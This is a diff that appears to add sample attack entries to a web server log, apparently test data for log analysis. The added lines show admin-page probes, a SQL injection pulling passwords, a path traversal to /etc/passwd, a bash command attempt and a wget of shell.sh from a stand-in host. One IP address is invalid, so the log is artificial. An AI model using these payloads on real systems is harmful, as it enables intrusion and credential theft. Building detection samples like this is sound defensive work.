@@ -3,3 +3,9 @@
 2026-03-15 10:05:22 WARNING Failed login from 185.23.44.12
 2026-03-15 10:06:12 INFO Request to /home from 192.168.1.11
 2026-03-15 10:07:55 ERROR Unauthorized access attempt to /admin from 103.88.12.7
+2026-03-15 10:08:30 ERROR GET /wp-login.php from 91.12.33.44
+2026-03-15 10:09:10 ERROR GET /phpmyadmin from 91.12.33.44
+2026-03-15 10:10:05 ERROR SELECT * FROM users UNION SELECT password FROM admin from 77.88.99.10
+2026-03-15 10:11:20 ERROR GET /../../../etc/passwd from 55.66.77.88
+2026-03-15 10:12:45 ERROR cmd=/bin/bash from 100.200.300.400
+2026-03-15 10:13:30 ERROR wget http://malicious.com/shell.sh from 44.55.66.77
